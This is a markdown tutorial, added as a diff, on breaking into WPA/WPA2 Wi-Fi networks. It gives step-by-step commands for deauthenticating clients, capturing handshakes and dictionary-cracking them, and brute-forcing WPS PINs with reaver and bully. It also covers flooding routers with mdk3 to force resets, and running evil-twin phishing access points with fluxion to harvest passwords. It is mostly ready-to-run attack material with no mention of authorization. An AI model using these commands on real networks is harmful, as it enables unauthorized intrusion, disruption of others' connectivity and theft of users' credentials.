@@ -1,0 +1,269 @@
+There are three ways to hack into WPA/WPA2 networks:
+* Cracking the password after the 4-way handshake capture
+* Exploiting WPS
+* Evil Twin Attacks with Open Network Web Authentication
+
+### WPA/WPA2 cracking with aircrack-ng
+
+We check our target network:
+```sh
+airodump-ng wlan0mon
+```
+
+Once we detected the target we can go on by doing:
+```sh
+airodump-ng --channel <channel_id> --bssid <ap_mac> --write <filenameprefix> wlan0mon
+```
+
+At this point we need the handshake, so we can either:
+* wait for a connection or
+* perform a deauthentication attack
+
+To perform a deauthentication attack we can do:
+```sh
+aireplay-ng --deauth 0 -a <ap_mac> -c <client_mac> wlan0mon
+# remember that if we omit the -c <client_mac> we will perform the attack
+# against all target connected
+# --deauth 0 will continue infinitely, e can also only specify a number like 10
+# to send only 10 deauthentication packets
+```
+
+
+We can stop as soon as we see in airodump the handshake popping up in the top
+right corner of the screen.
+
+Now we can use a dictionary attack to crack the password:
+
+```sh
+aircrack-ng --new-session <filename>.session <filename.cap> -w </path/to/wordlists.txt>,</path/to/wordlist2.txt>
+```
+we may restore the session with:
+
+```sh
+aircrack-ng --restore-session <filename>.session 
+```
+On some versions this may not work and we should help us with john by doing:
+```sh
+john --session=foo --stdout --wordlist=wordlist.dic | aircrack-ng -w - -b <target_mac> file.cap
+```
+And restore it with:
+```sh
+john --restore=foo | aircrack-ng -w - -b <target_mac> file.cap
+```
+
+Notice that we can filter out from our wordlists words shorter than 8 characters 
+or longer than 63 characters, also remember that passphrases only contain ASCII
+characters.
+
+
+### WPA/WPA2 cracking with wifite
+
+For WPA2, let's be sure to have at least wifite.py version 2.00.
+
+```sh
+wifite --no-reaver --dict <path/to/wordlists.txt>
+# we have to explicitly say to not attempt WPS attacks if we want to crack
+# WPA2 passwords
+```
+
+Now we can just press ctrl+c and then choose our target WPA2 encrypted network.
+At this point the attack will start and we will just have to wait, it will start
+a deauthentication attack to capture the handshake and the subsequently it will
+start the cracking process.
+
+### WPS cracking with wash, reaver and bully
+
+WPS networks can be attacked by using a combination of tools, such as:
+* Wash, which is used to identify WPS networks
+* Reaver, which is used to determine the WPS pin
+* Bully, which is used to find th WPA2 password with a known WPS pin
+
+```sh
+wash -i wlan0mon
+```
+
+Now if we see associated to a certain WiFi the Lck (Lock) string set to:
+* No, it means that we can attempt a WPS attack with reaver
+* Yes, it means that the router is not susceptible to WPS attack, or that it has
+  been locked by somme passwords attempt, we may try to wait few minutes
+
+Now we can copy the MAC address of the target access point and then use reaver:
+```sh
+reaver -i wlan0mon -b <mac_address> -v -N
+# the -v or -vv gives us verbose output
+# notice that we may enable a delay between attempt
+# -N will not attempt the same pin over and over
+```
+
+Some routers may have lockout policies, so it may be a good idea to attempt
+the attack like this:
+```sh
+reaver -i wlan0mon -b <mac_address> -vv -N -d 3 -l 120
+# here we set a delay of 3 seconds between pin attempts
+# and a lockout wait of 120 seconds
+```
+
+Once we know the pin we can retrieve the password of the wify by using tools
+like `bully`, and by doing:
+```sh
+bully -b <mac_ap> -p <WPS_pin> wlan0mon
+```
+If we get an error saying that the PIN number must be less then 8 digits, we can
+just remove the last digit, since that is the checksum digit as we may recall.
+
+Notice that in more recent versions of reaver, the functionality of bully is 
+integrated inside reaver.
+
+
+#### Troubleshooting reaver problems
+
+Sometimes reaver can just get stuck, and a good idea to troubleshoot the problem
+is to rerun reaver by using the `-vvv` flags to enable a very verbose mode.
+
+##### Failed to Associate
+
+When we have this problem, we may try to fix it by stopping reaver and using aireplay-ng 
+and doing:
+```sh
+aireplay-ng --fakeauth 100 -a <mac_ap> -h <my_mac> mon0
+```
+
+This will basically allow us to associate with the target, instead of using
+reaver to associate with the target.
+
+Now we can launch reaver by doing:
+```sh
+reaver -i wlan0mon -b <mac_address> -N -d 3 -l 120 -A 
+# the -A flag, will not ask reaver to associate
+```
+
+##### Percentage Stuck at xx%%
+
+In this case we may want to debug further by using reaver in a very verbose
+mode:
+```sh
+reaver -i wlan0mon -b <mac_address> -vvv -N -d 3 -l 120 -A
+```
+
+If we see that the same PIN is tried over and over, we can launch reaver with
+the `-N` flag.  So we can fix this problem by doing:
+```sh
+reaver -i wlan0mon -b <mac_address> -vvv -N -d 3 -l 120 -A -N
+```
+
+##### Detected AP rate limiting
+
+This message is received when routers lock after a number of failed attempts.
+The solutions to this problem can be:
+* Get the user to reset the router
+* Try somehow to reset the router
+
+
+One way to do this, is to deauthenticate all the computers on the network, and
+hope that some of the users will go there and restart the router.
+
+```sh
+aireplay-ng --deauth -a <ap_mac> 
+# this will deauthenticate all the clients
+```
+
+Another solution is to use mdk3, which by flooding the router causes on some
+models to reset autommatically.
+
+```sh
+mdk3 mon0 a -a <ap_mac> -m
+# this will basically send plenty of authentication frames coming from a huge
+# number of different fake MAC addresses, and will freeze or reset almost every AP
+# the `a` specifies an authentication attack
+# the `-a` specifies to perform the attack only on a specific target
+# the `-m` specifies to use only valid MAC addresses taken from the OUI database
+```
+
+At this point, although we see the "INVULNERABLE" strings coming out, we should
+wait a little bit, sometimes we really need a huge number of clients like
+50,000 clients.
+We won't have any message telling us that it worked, after a while we press
+ctrl+c and we can check if the AP is locked by using wash and doing:
+```sh
+wash -i mon0
+```
+
+Remember that this works on many routers, but not all.
+
+
+### WPS cracking with wifite
+
+We can attempt to crack WPS by using wifite, and this can be done by simply
+doing:
+
+```sh
+wifite
+```
+
+Then detecting the target network which WPS enabled, at this point we press
+ctrl+c and then select the target network through its ID number.
+
+Wifite, will automatically attempt a bruteforce of the PIN and give us both the
+PIN and the wireless security.
+
+
+### Evil Twin Attack for WPA/WPA2
+
+This is the last resort to attack WPA/WPA2 networks, which uses social
+engineering too perform the attack, what we do here is to create an evil twin
+network which has no authentication with an automatic redirect to a web login
+page where the user will have to insert username and password.
+Now of course this will not work with more skilled users which will notice that
+the network has no authentication and is asking strangely for credentials on a
+web page, but still it has a very high success rate. 
+
+Basically here, we can do the entire procedure (exact same steps) reported in
+the section related to attacking captive portals.
+The only difference is that in this case we do not have any page to clone so we
+have to carefully choose the web page that we are going to use. Some ideas are:
+* If we know the network provider we can take some samples online with the
+  provider logo or create one, generally we may know network provider sometimes
+  from the SSID
+* Examining the MAC address of the router we can understand what is the brand
+  and download or create a login page similar to the ones used by these brands
+* Design one ourselves
+* Download some template online
+
+Here we will show an alternative way to create a fake AP without doing all the
+steps manually but using some software to do all of this automatically.
+One software to automate all the manual steps shown before is `fluxion`.
+
+Fluxion will basically:
+1. Start a fake AP with the same name as the target network
+2. Start a web server with a fake login page
+3. Deauthenticate all the clients
+4. Display the login page once a client connects to the fake AP
+5. Check if the entered password is correct
+
+Notice that fluxion cannot be used for captive portals, so the manual steps
+described in the captive portal section are still useful and needed in that
+scenario.
+
+Once fluxion is installed, we can launch it by doing:
+```sh
+bash fluxion.sh
+```
+
+At this point the procedure is guided, so we just use numbers to make our
+choices inside the fluxion interface.
+
+Notice that we may still have a problem related to the visualization of the page
+in certain scenarios, in this cases, the problems are still related to not using
+absolute links in the html page.
+We can fix this, by modifying the index html page found in the temporary
+directory created by fluxion which is in `/tmp/` and by performing a couple of
+search and replace, that are:
+* `href="` with `href="/`
+* `src="` with `src="/`
+* `form action="` with `form action="/`
+
+Now everything will work.
+
+Another good suggestion is to explore `wifiphiser` which is another very useful
+tool to perform Evil Twin Attacks, KARMA Attacks and other kinds of credentials
+stealing phishing attacks.
